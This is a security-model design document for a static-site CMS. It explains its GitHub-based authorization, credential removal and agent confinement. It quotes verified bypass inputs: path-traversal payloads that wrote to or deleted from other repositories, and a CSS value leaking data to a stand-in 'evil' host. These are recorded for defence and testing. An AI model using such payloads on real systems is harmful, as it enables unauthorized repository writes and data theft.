# Security model

The auth/authz rules the tenant site and the broker depend on, and why each exists.
Every rule here is here because something got past: the 2026-07-25 review found four
ways to bypass the `/admin` gate, the 2026-07-26 sweep found five more, and the
2026-08-29 release deleted the credential that would have made any of them fleet-wide.

Companions: `keys-and-secrets.md` (every credential and who holds it),
`onboarding-workflow.md` (life of an onboarding), `release-plan.md` (the sovereignty
work this file now describes), `mcp-server.md` (the agent surface). **This file is
authoritative where they disagree.**

**Current as of 2026-08-29.** The zero-secret migration is complete. If you are
reading a doc that mentions `HANDOFF_PRIVATE_KEY`, `adminLogin`, `lanza_session`,
`/api/token`, an audience claim, or the fan-out, that doc is stale and this one wins.

---

## 0. The shape, in one paragraph

A tenant site is a static Cloudflare Pages deployment of the customer's own repo, in
the customer's own Cloudflare account. **Who you are and what you may do are both
answered by GitHub**, per request: a device-flow user token in an HttpOnly cookie says
who, and `permissions` on the repo says what. Nothing signs a session. The broker
(`connect.lanzacms.com`) automates onboarding and then has nothing further to do with
the site: it holds no key that can read or write a tenant repository, and a tenant
accepts nothing the broker signs.

That last sentence is the release bar. It is I3 below, and it is the one to check any
change against.

---

## 1. The invariants

### I1 — A valid credential is not authorization

A token proves identity. Whether that identity may touch *this* site is a second,
separate question, and both must be asked. GitHub answers both, but they are different
calls: `GET /user` is who, `GET /repos/{owner}/{name}` → `permissions` is what
(`functions/_lib/gh-identity.ts`, cached 60s).

| Gate | File | Identity | Authorization |
|---|---|---|---|
| `/admin/*` (SPA + both proxies) | `functions/admin/_middleware.ts` | ✅ | ✅ |
| `/admin/api/gh/*` | `functions/admin/api/gh/[[path]].ts` | inherited | ✅ re-asked per request |
| `/admin/api/auth/agent/*` | `agent/{start,poll}.ts` | inherited | ✅ owner only |
| `/api/mcp` | `functions/api/mcp.ts` | ✅ | ✅ owner only |

`functions/admin/api/cf/[[path]].ts` performs **no check of its own** — it trusts the
middleware completely and then attaches an account-scoped Cloudflare API token.
Anything that weakens the middleware hands out that token. Do not add a route under
`/admin/` that bypasses it.

> The review found the middleware checking identity only. Any GitHub user could log in
> and reach `/admin/api/cf/*`.

The 60-second cache is also the answer to revocation: removing someone's repo access
takes effect within a minute. The session it replaced was a 7-day bearer that could not
be revoked at all.

### I2 — Validate the URL you are about to fetch, not the string you were given

A path allowlist inspects a string; what leaves the Worker is a **parsed URL**, and only
the parser decides what a path segment means. They disagree in ways that are not obvious:

- WHATWG URL treats `\` as a path separator, so `..\..\x` traverses.
- `%2e%2e` **is** a dot segment per RFC 3986 and normalizes on parse.
- `encodeURIComponent` does not escape `.`, so encoding a path does not neutralize `..`.

Both GitHub clients validate twice:

| | String check | Resolved check |
|---|---|---|
| `functions/_lib/gh-proxy.ts` | `isAllowed()` — folds `\` and repeated percent-decoding before the dot-segment test | `upstreamTargetAllowed()` — the parsed URL must stay under `/repos/<owner>/<name>/` or be `/user` |
| `functions/_lib/lanza-content.ts` | `assertSafePath()` — rejects `..`, `.`, leading `/`, `\`, `%`, NUL, empty segments, `.git` | (paths are repo-relative by construction) |

> Verified bypasses, all now blocked and covered by tests:
> `PUT contents/..\..\..\..\repos/attacker/evil/contents/pwn.md` → wrote to another repo.
> `DELETE contents/%2e%2e/…/git/refs/heads/main` → deleted the branch Astro builds from.

The gate refuses `%2f`, `%5c` and `%2e` in an `/admin` path outright, before any other
test. It reads `url.pathname`, which leaves those encoded, while the router may not —
rather than decide who decodes what, the only inputs where the two can disagree are
refused. The exemption list is an **exact set**, not a prefix: it used to be
`startsWith("/admin/api/auth/")`, and `/admin/api/auth/..%2fcf/accounts/…` passed it.

This invariant applies to the broker's GitHub client too. `gh-app.ts` interpolated a
request-supplied `repo` into `api.github.com` paths with no validation, so
`x/../../victim/secret` resolved into another tenant's repo. Names are checked against
GitHub's own grammar (`isValidOwner`/`isValidRepo`) before any interpolation.

### I3 — Nothing outside a tenant holds a key to that tenant

Once someone installs Lanza, the site is theirs. No service Lanza runs may hold a
credential that can read or write their repository, or that a tenant will accept as
proof of anything.

This was not true until 2026-08-29, and it is the release. What was deleted:

| Was | Could |
|---|---|
| `GH_APP_PRIVATE_KEY` on the broker | mint `Contents:write` on **every** repo the `lanza-cms` App is installed on — the whole fleet, from one Worker, forever |
| `HANDOFF_PRIVATE_KEY` on the broker | sign a session as any login, for any site, valid 7 days, unrevocable |
| the fan-out | force-write every tenant repo below the `critical` dist-tag, unasked |
| `/api/token` | trade a broker-signed session for a repo-scoped GitHub token |

Repo write was the sharp end: Cloudflare Pages rebuilds from that repo on push, so
control of `package.json` is arbitrary code on the customer's live site.

**The App stays installed, and must.** A GitHub App's user-to-server token only reaches
repositories the App is installed on, so the tenant's own device-flow sign-in depends on
that install. Uninstalling was the first idea and it was wrong. What is gone is anyone
holding a key that can act *as* the App rather than as a person — device flow needs only
the public `client_id`.

What the broker still holds: two OAuth client secrets (GitHub `public_repo` for repo
creation, Cloudflare for the Pages deploy). Both are onboarding-only and both are
useless without a fresh user authorization, so neither can reach a site that has
finished onboarding.

**The residual risk, stated:** whoever controls the GitHub App's settings page can
generate a new private key. That is inherent to owning the App. The blast radius is
therefore "someone compromises the owner's GitHub account", not "someone compromises a
Worker" — a different and much smaller surface, but not zero.

### I4 — A denial is not an outage

Nothing in the system currently falls back to a broader credential, and nothing may be
added that does. The rule survives its code because the code kept coming back.

`/admin/api/gh/*` once asked the broker for a token and fell back to a standing
`GITHUB_TOKEN` PAT when the broker could not answer. A fallback like that must never
trigger on a **refusal**: a caller the broker had just rejected would be handed broader
credentials than the ones it was denied. The three-state result (`{token}` / `denied` /
`null`, where only `null` falls through) was the fix; deleting the mint and the PAT was
the better one.

If you add a credential source with a fallback, it needs this distinction on day one.

### I5 — An editor is a lesser role, not an untrusted one

`roles.ts` grants `editor` writes only to Markdown under `content/` and raster images
(PNG, JPEG, GIF, WebP, AVIF) under `public/images/uploads/`, only on the working
branch, and never `POST /merges`. Contents writes and git-data tree entries share
this path policy; executable files, symlinks and submodules cannot be introduced.

Before updating a draft ref, `editor-ref.ts` checks the complete immutable tree
against the current draft. Checking only the submitted entries would miss a reused
tree or deletions caused by an omitted `base_tree`. Incomplete tree responses fail
closed. The commit must have exactly one parent: the current draft head. Ref updates
must be non-force, so an intervening sibling commit makes GitHub reject the write.
Creating a missing draft branch may only copy the current production commit. The
Vite development proxy invokes this same production handler with the token's real
repository role. Missing roles default to read-only.

CMS JSON/text saves retain the version originally loaded and surface conflicts
without retrying stale data against a newer SHA. Theme install/revert uses a pinned
review head. Discard checks both reviewed branch heads and creates a non-force
recovery commit whose parents preserve both histories; it does not reset staging.

This bounds a careless or compromised editor. It is not a sandbox for someone you would
not otherwise let near the site: they can write your content, and content is what the
site is.

---

## 2. How a tenant's Pages project is named

`lanza-broker/functions/_lib/tenant-origin.ts`.

**The name is not the repo name, and the user does not choose it.**

```
projectNameCandidates(owner, repo)[0] = `${slug(repo)}-${sha256(owner/repo)[0..12]}`

  datadefine/test    →  test-0304ea543eaf.pages.dev
  someone/test       →  test-f3d658bc73b5.pages.dev   (same repo name, no collision)
  acme/"My Bakery!"  →  my-bakery-ccb492ff422f.pages.dev
```

**`*.pages.dev` is a global namespace** — unique across *every* Cloudflare account, not
just the user's. Naming a project after its repo meant ordinary names (`test`, `blog`,
`bakery`) collided with strangers on the first attempt. Worse, the collision was
invisible: `projectExists` only checks *our* account, so a stranger's name read as
"already exists → success", deployed nothing, and the wizard then invited the user to
log in at a third party's `/admin`.

A 48-bit suffix bound to `owner/repo` fixes that and cannot be squatted.

> **Historical, and worth keeping.** The name also had to be *derivable*, because
> `/api/token` recomputed a tenant's origin to check a session's audience. That endpoint
> is deleted and there is no audience left to check, so the constraint is gone — but the
> derivation stays, because every deployed tenant is already named this way.
>
> The authorization use of these names was itself a bug. `allowedOriginsForRepo` used to
> accept every candidate in the fallback ladder (`base-2`, `base-3`, `base-4`) — names
> **no tenant holds**, in a namespace **anyone can register in**. Verified: an attacker
> computes a victim's `base-2`, creates a Pages project of that name in their own
> account, serves a handoff endpoint there, and receives a real session for the victim's
> repo. The lesson outlives the code: **an origin used in an authorization decision must
> be one a tenant demonstrably holds.**

**Constraints if you touch this:** Cloudflare Pages names are lowercase alphanumerics
and hyphens, 58 chars max, start and end alphanumeric. The base slug is capped at 42 so
`base + "-" + 12 hex + "-4"` stays inside 58.

---

## 3. What the MCP server may touch

The MCP tools run on behalf of an **agent**, which may be acting on prompt-injected
input. Auth is the owner's own GitHub token, pasted from `/admin` → Connect an agent
(`AGENT_CLIENT_ID`, the `lanza-agents` App, Contents-only). The endpoint validates it
by asking GitHub the same question the `/admin` gate asks, and requires `owner`.

The tools are confined twice:

1. `assertSafePath()` — structural (I2). Applies to every path reaching the Contents
   API, including `data/site.json` and `data/schema.json` reads.
2. `assertEntryPath()` (`mcp-core.ts`) — the entry tools (`read`/`update`/`delete`)
   additionally require a `.md` file inside a folder some collection declares.

**Read `assertEntryPath` as a guard against a *steered agent*, not against a *stolen
token*.** The token is the owner's own GitHub credential; whoever holds it can call
GitHub directly and skip these tools entirely. The confinement narrows what a
prompt-injected agent can do through this surface. It does not bound the credential.

That is a fair trade only because the token is the owner's, not ours, and because
revoking it is one click at github.com/settings/applications, effective immediately.
Under the old design the equivalent token was minted by the broker, which is what made
its theft a fleet problem rather than a personal one.

### A template is not content, and an agent writing one is a boundary change

Templates are raw `set:html` on the `/admin` origin, so a template write is a code
change wearing content's clothes. `checkTemplateSafety()` parses (not greps) for the
constructs that matter, `frontend/lib/assert-rendered-safe.ts` fails the BUILD if a
rendered *value* produced a live URL scheme, an `on*` handler, `srcdoc`, `<base href>`,
a meta refresh, or script/style text, and the review surface
(`docs/review-surface.md`) shows the owner a diff they can revert. Severity is by
author: an agent-authored template is a proposal, not a deployment.

---

## 4. Deployment requirements this model imposes

| Setting | Where | Why | If unset |
|---|---|---|---|
| `GITHUB_CLIENT_ID` | tenant (optional) | overrides the committed `lanza-cms` client id | falls back to `tenant-config.ts` — correct for every normal tenant |
| `AGENT_CLIENT_ID` | tenant (optional) | overrides the committed `lanza-agents` client id | same |
| `CLOUDFLARE_API_TOKEN` | tenant (opt-in) | the Site Health panel and KV/D1/R2 provisioning | those features 503 and say so. **This is the default state** |
| `OAUTH_CLIENT_ID` / `OAUTH_CLIENT_SECRET` | broker | classic OAuth App, `public_repo`, creates the tenant repo | onboarding cannot start |
| `CLOUDFLARE_OAUTH_CLIENT_ID` / `_SECRET` | broker | the Pages deploy step | onboarding step 3 fails |
| `TEMPLATE_OWNER` / `TEMPLATE_REPO` | broker | repo creation | onboarding fails |
| `GH_APP_SLUG` | broker | the install link | defaults to `lanza-cms` |

**A tenant needs no configuration at all.** Everything it must know is either committed
(`lanza.config.json` names the repo; `tenant-config.ts` carries the two public client
ids) or asked of GitHub at request time. There is no per-tenant secret, and there is
nothing to inject at deploy.

Gone from this table, and from the broker: `GH_APP_ID`, `GH_APP_PRIVATE_KEY`,
`HANDOFF_PRIVATE_KEY`, `HANDOFF_PUBLIC_KEY`, `ALLOWED_TENANT_ORIGINS`, `FANOUT_SECRET`,
`ADMIN_LOGIN`.

---

## 5. Known-accepted risks

Real, reviewed, not currently fixed. Listed so they are decisions rather than oversights.

- **The agent token does not expire.** The `lanza-agents` App has user-token expiry off,
  deliberately: the token is pasted into an MCP client's config and nothing there can
  refresh it, so an 8-hour token would mean re-pasting three times a day. The cost is
  that a leaked agent token is good until revoked. The control is that it is the
  owner's own credential, revocation is immediate at github.com/settings/applications,
  and the CMS says so on the screen that issues it. The CMS's own token keeps the
  8-hour expiry and server-side refresh, because a cookie can be refreshed.
- **The agent screen returns a token to JavaScript.** It is the only endpoint that
  does, against the rule the sign-in relays follow. There is no version of "paste this
  into your agent" where the page never sees it. What is preserved: a different App's
  token (so it cannot become a session), owner-only, on an explicit click, shown once,
  stored nowhere.
- **An agent-written template may carry a `<form>` or a `<link>` that reaches off-site.**
  `template-loads-remote` is reported and not refused — a contact form posting to a form
  service and a linked webfont are both ordinary on a static site. Residual risk: a
  phishing form on the owner's own domain, or a stylesheet fetch leaking visitor IPs.
  The control is the review surface.
- **A blocklist is a claim about the future.** `checkTemplateSafety()` enumerates the
  constructs known to matter today. It parses rather than greps, so the usual evasions
  do not apply, but a construct nobody has thought of is not covered by definition.
- **A `<style>` element with a placeholder is a CSS context the engine treats as text.**
  `style="…"` attributes are refused outright, but `<style>.a{color:{{c}}}</style>` only
  gets HTML escaping — enough to stop a `</style>` breakout (entities are literal in a
  raw-text element, verified) but not `background:url(https://evil/?leak)`. No shipped
  template has this shape.
- **The public site has no full CSP and no `frame-ancestors`.** A decision, not an
  oversight: a customer's public site may legitimately be embedded, and a `script-src`
  would have to account for whatever a tenant's theme loads. Post bodies are sanitized
  (`frontend/lib/sanitize.ts`), which is the actual control. `/admin` has a real CSP —
  note `_headers` does NOT apply to Pages Function responses, so that policy lives in
  `_lib/admin-gate.ts`.
- **A Cloudflare access token passes through the browser during onboarding.**
  `lanza_cf` holds it as unauthenticated base64 JSON (`HttpOnly; Secure`, `Max-Age=3600`).
  It carries no refresh token (`offline_access` is not requested), so it is bounded by
  the cookie's own hour, and the wizard genuinely needs `page.write` in the browser's
  flow to create the Pages project.

  **Option B is closed — deliberately not built.** A per-tenant token store would have
  made the broker custodian of every tenant's Cloudflare credential: one namespace,
  `page.write` on the fleet. The store-nothing variant was **verified impossible** —
  Cloudflare's OAuth vocabulary carries 371 scopes, none grant API-token management, and
  `GET /user/tokens` on an OAuth token is `403 code 9109`. Cloudflare features in the CMS
  are opt-in on the tenant's own token instead.

  Scopes: `account-settings.read`, `user-details.read`, `page.read`, `page.write`. Four,
  each with a caller.
- **`/api/auth/cf/login` honours an unauthenticated `?scope=` override.** Not an
  escalation: the extra scopes face Cloudflare's own consent screen, the token lands only
  in the HttpOnly `lanza_cf` cookie, and no code path uses a scope beyond the four. The
  cost is consent-phishing optics.
- **No `Origin` validation on the MCP transport.** The spec asks for it against DNS
  rebinding; impact is low because auth is Bearer, not cookie.
- **The security floor is advisory in one direction.** `lanza build` refuses below the
  `critical` dist-tag, but the repo is the tenant's and they can pin whatever they like.
  This is the intended state: the fan-out that used to enforce it did so by writing to
  their repository without asking, and that was the larger problem. A refused build does
  not take a site down — Cloudflare keeps serving the last deployment — it blocks new
  deploys until the owner acts.
- **An orphan repo is left behind** when a user rejects the App install screen, because
  creation precedes consent.
- **`setup.ts` no longer verifies the App install.** It ran on the App JWT, which is the
  credential I3 deleted. A person who deselected their repository now learns at their own
  `/admin`, which names the install and links to it.

---

## 6. Reviewing changes to this surface

- **Adding anything that a service outside the tenant holds?** That is I3. If Lanza
  would hold a credential that can reach a customer's repo, the answer is no, and the
  design needs to change rather than the invariant.
- Adding a route under `/admin/`? It inherits the middleware — confirm it should.
- Adding a GitHub call? Use an existing client. A third one means a third place I2 can
  be forgotten, and it was.
- Adding an origin to an authorization decision? It must be one a tenant demonstrably
  **holds**. Derived-but-unclaimed names are squattable (§2).
- Adding a credential with a fallback? I4. Distinguish "refused" from "unreachable"
  before you write the fallback, not after.
- **`frontend/lib/assert-rendered-safe.ts` is the control you should actually rely on**
  for template safety. It parses the RENDERED output with parse5 — the same tokenizer a
  browser uses — and fails the build if a VALUE produced something live. It renders twice
  (real data, then every value replaced by an inert token) and reports only the
  difference, so author markup like `<button onclick="doThing()">` is never flagged.
  It exists because the engine's position classifier was wrong five times in five review
  rounds, always the same way. **This check does not depend on the engine being
  correct.** Build-time only — parse5 must not enter the browser bundle (asserted).
- Touching `frontend/lib/template-render.ts`? Its safety depends on knowing WHERE a
  placeholder sits, and **every** bug it has had was a misclassification, not a bad
  escape. Three attempts to answer "am I inside a tag?" by looking BACKWARDS were each
  bypassable, because a quoted attribute value may legally contain `<` or `>`:
  `lastIndexOf("<") > lastIndexOf(">")` fell to `alt="a>b"`; seeking to the last `<` fell
  to `alt="a<b>c"`; a fixed-size window dropped the opening `<` behind a long attribute
  and failed **open**. It is now a forward state machine advanced one character at a
  time — do not replace it with a lookback. It also has to skip what is NOT markup: a
  quote inside a comment, `<script>`, `<style>` or `<title>` used to open an attribute
  value that never closed. Also load-bearing: `/` separates attribute names (`<a/href=`
  is an href to a browser), a `{{#if}}` body is not a literal prefix, and `{{{raw}}}` is
  only "already-safe HTML" in a markup position. An unknown position must fail closed.
- Adding an MCP tool that takes a path or a path fragment? Route it through
  `assertEntryPath` (entries) or `assertSafePath` (anything else). Interpolating a tool
  argument into a path without one of those is the bug class that produced the
  CI-workflow write.
- Changing `isAllowed`, `assertSafePath`, or the role rules? The adversarial cases live
  in `functions/_lib/gh-proxy.test.mjs`, `roles.test.mjs`, `admin-gate.test.mjs` and
  `mcp-core.test.mjs`. They assert refusal **and** that nothing was written — keep both
  halves.
- Touching the agent authorization? `functions/_lib/agent-auth.test.mjs` covers
  owner-only on both relays, the device code never reaching the page, the cookie binding,
  and a token that cannot reach the repository being reported rather than handed over.
